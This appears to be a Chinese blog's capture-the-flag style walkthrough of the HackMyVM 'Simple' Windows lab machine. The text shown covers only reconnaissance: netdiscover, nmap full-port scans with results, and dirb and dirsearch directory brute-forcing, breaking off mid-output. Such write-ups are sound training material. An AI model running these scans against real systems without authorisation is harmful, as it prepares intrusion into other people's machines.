<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM - Simple">
<meta property="og:url" content="https://z9m8r8.github.io/2024/10/28/HackMyVM%20-%20Simple/index.html">
<meta property="og:site_name" content="Phantom&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-10-27T16:00:00.000Z">
<meta property="article:modified_time" content="2024-12-14T12:16:10.692Z">
<meta property="article:author" content="Phantom">
<meta property="article:tag" content="信息收集">
<meta property="article:tag" content="提权">
<meta property="article:tag" content="反弹 shell">
<meta property="article:tag" content="SMB">
<meta property="article:tag" content="HackMyVM">
<meta property="article:tag" content="crackmapexec">
<meta property="article:tag" content="RunasCs">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="ASP.NET">
<meta property="article:tag" content="aspx-reverse-shell">
<meta property="article:tag" content="SeImpersonatePrivilege 提权">
<meta property="article:tag" content="GodPotato">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2024/10/28/HackMyVM%20-%20Simple/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/10/28/HackMyVM%20-%20Simple/","path":"2024/10/28/HackMyVM - Simple/","title":"HackMyVM - Simple"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackMyVM - Simple | Phantom's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Phantom's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smb-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.4. SMB 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3-marcos"><span class="nav-text">2.2. 提权至 marcos</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3-system"><span class="nav-text">2.3. 提权至 system</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">3. 参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Phantom"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Phantom</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">181</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">169</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/10/28/HackMyVM%20-%20Simple/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Phantom">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Phantom's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackMyVM - Simple | Phantom's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackMyVM - Simple
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-10-28 00:00:00" itemprop="dateCreated datePublished" datetime="2024-10-28T00:00:00+08:00">2024-10-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-12-14 20:16:10" itemprop="dateModified" datetime="2024-12-14T20:16:10+08:00">2024-12-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>6.7k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>24 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><blockquote>
<p>靶机：<a
target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Simple">HackMyVM -
Simple</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 10.0.3.0/24</span><br></pre></td></tr></table></figure>
<p>靶机：10.0.3.30</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">┌─[✗]─[root@parrot]─[/home/user/Desktop]</span><br><span class="line">└──╼ <span class="comment">#nmap -sS -sV 10.0.3.30 -p-</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 08:11 UTC</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.30</span><br><span class="line">Host is up (0.0042s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">MAC Address: 08:00:27:43:44:C4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 106.77 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV -sC 10.0.3.30 -p-                        </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 07:50 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.30</span><br><span class="line">Host is up (0.0053s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Simple</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">MAC Address: 08:00:27:43:44:C4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_nbstat: NetBIOS name: SIMPLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:43:44:c4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-10-27T18:52:24</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: 6h59m57s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 115.49 seconds</span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 主页</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410272020038.jpg" /></p>
<p>扫目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">┌─[user@parrot]─[~/Desktop]</span><br><span class="line">└──╼ <span class="variable">$dirb</span> http://10.0.3.30 -R</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Oct 27 08:38:17 2024</span><br><span class="line">URL_BASE: http://10.0.3.30/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">OPTION: Interactive Recursion</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.0.3.30/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.0.3.30/aspnet_client/                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://10.0.3.30/fonts/                                                                                  </span><br><span class="line">==&gt; DIRECTORY: http://10.0.3.30/images/                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://10.0.3.30/Images/                                                                                 </span><br><span class="line">+ http://10.0.3.30/index.html (CODE:200|SIZE:1481)                                                                      </span><br><span class="line">                                                                                                                        </span><br><span class="line">---- Entering directory: http://10.0.3.30/aspnet_client/ ----</span><br><span class="line">(?) Do you want to scan this directory (y/n)? y                                                                          ==&gt; DIRECTORY: http://10.0.3.30/aspnet_client/system_web/                                                               </span><br><span class="line">                                                                                                                        </span><br><span class="line">---- Entering directory: http://10.0.3.30/fonts/ ----</span><br><span class="line">(?) Do you want to scan this directory (y/n)? y                                                                                                                                                                                                  </span><br><span class="line">---- Entering directory: http://10.0.3.30/images/ ----</span><br><span class="line">(?) Do you want to scan this directory (y/n)? y                                                                          --&gt; Testing: http://10.0.3.30/images/_mygallery                                                                         </span><br><span class="line">                                                                                                                        </span><br><span class="line">---- Entering directory: http://10.0.3.30/Images/ ----</span><br><span class="line">(?) Do you want to scan this directory (y/n)? n                                </span><br><span class="line">Skipping directory.</span><br><span class="line">                                                                                                                        </span><br><span class="line">---- Entering directory: http://10.0.3.30/aspnet_client/system_web/ ----</span><br><span class="line">(?) Do you want to scan this directory (y/n)? y                                                                                                                                                                                                  </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Oct 27 08:43:10 2024</span><br><span class="line">DOWNLOADED: 23060 - FOUND: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>哎，parrot os 用着属实不习惯，还是换 Kali 继续肝……</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;http://10.0.3.30/&quot;  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 2&gt;&amp;/dev/null</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 220545</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/reports/http_10.0.3.30/__24-10-27_05-07-33.txt</span><br><span class="line"></span><br><span class="line">Target: http://10.0.3.30/</span><br><span class="line"></span><br><span class="line">[05:07:33] Starting: </span><br><span class="line">[05:07:33] 301 -  158B  - /images  -&gt;  http://10.0.3.30/images/             </span><br><span class="line">[05:07:35] 301 -  158B  - /Images  -&gt;  http://10.0.3.30/Images/             </span><br><span class="line">[05:08:06] 301 -  157B  - /fonts  -&gt;  http://10.0.3.30/fonts/               </span><br><span class="line">[05:08:14] 301 -  158B  - /IMAGES  -&gt;  http://10.0.3.30/IMAGES/             </span><br><span class="line">[05:08:15] 404 -    2KB - /%20                                              </span><br><span class="line">[05:08:32] 301 -  157B  - /Fonts  -&gt;  http://10.0.3.30/Fonts/               </span><br><span class="line">[05:08:51] 400 -    4KB - /*checkout*                                       </span><br><span class="line">[05:11:05] 400 -    4KB - /*docroot*                                        </span><br><span class="line">[05:11:22] 400 -    4KB - /*                                                </span><br><span class="line">[05:11:49] 404 -    2KB - /con                                              </span><br><span class="line">[05:13:19] 400 -    4KB - /http%3A%2F%2Fwww                                 </span><br><span class="line">[05:15:09] 400 -    4KB - /http%3A                                          </span><br><span class="line">[05:15:42] 400 -    4KB - /q%26a                                            </span><br><span class="line">[05:15:46] 400 -    4KB - /**http%3a                                        </span><br><span class="line">[05:16:20] 400 -    4KB - /*http%3A                                         </span><br><span class="line">[05:18:31] 404 -    2KB - /aux                                              </span><br><span class="line">[05:20:57] 400 -    4KB - /**http%3A                                        </span><br><span class="line">[05:21:03] 400 -    4KB - /http%3A%2F%2Fyoutube                             </span><br><span class="line">[05:25:42] 400 -    4KB - /http%3A%2F%2Fblogs                               </span><br><span class="line">[05:26:20] 400 -    4KB - /http%3A%2F%2Fblog                                </span><br><span class="line">[05:30:02] 400 -    4KB - /**http%3A%2F%2Fwww                               </span><br><span class="line">[05:31:41] 400 -    4KB - /s%26p                                            </span><br><span class="line">[05:36:28] 400 -    4KB - /%3FRID%3D2671                                     </span><br><span class="line">[05:37:37] 400 -    4KB - /devinmoore*                                       </span><br><span class="line">[05:45:30] 404 -    2KB - /KeithRankin%20                                    </span><br><span class="line">[05:51:16] 404 -    2KB - /Wanted%2e%2e%2e                                   </span><br><span class="line">[05:51:16] 404 -    2KB - /How_to%2e%2e%2e                                   </span><br><span class="line">[05:52:51] 404 -    2KB - /kaspersky%20                                      </span><br><span class="line">[05:56:23] 400 -    4KB - /200109*                                           </span><br><span class="line">[05:57:05] 400 -    4KB - /*sa_                                              </span><br><span class="line">[05:57:05] 400 -    4KB - /*dc_</span><br><span class="line">[06:03:05] 400 -    4KB - /http%3A%2F%2Fcommunity                            </span><br><span class="line">[06:05:05] 400 -    4KB - /Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29</span><br><span class="line">[06:05:05] 400 -    4KB - /Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct</span><br><span class="line">[06:05:07] 400 -    4KB - /DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt</span><br><span class="line">[06:06:37] 400 -    4KB - /http%3A%2F%2Fradar                                </span><br><span class="line">[06:10:30] 400 -    4KB - /q%26a2                                            </span><br><span class="line">[06:10:46] 400 -    4KB - /login%3f                                          </span><br><span class="line">[06:12:58] 400 -    4KB - /Shakira%20Oral%20Fixation%201%20%26%202           </span><br><span class="line">[06:12:59] 404 -    2KB - /Cirque%20du%20soleil%20                           </span><br><span class="line">[06:14:52] 400 -    4KB - /http%3A%2F%2Fjeremiahgrossman                     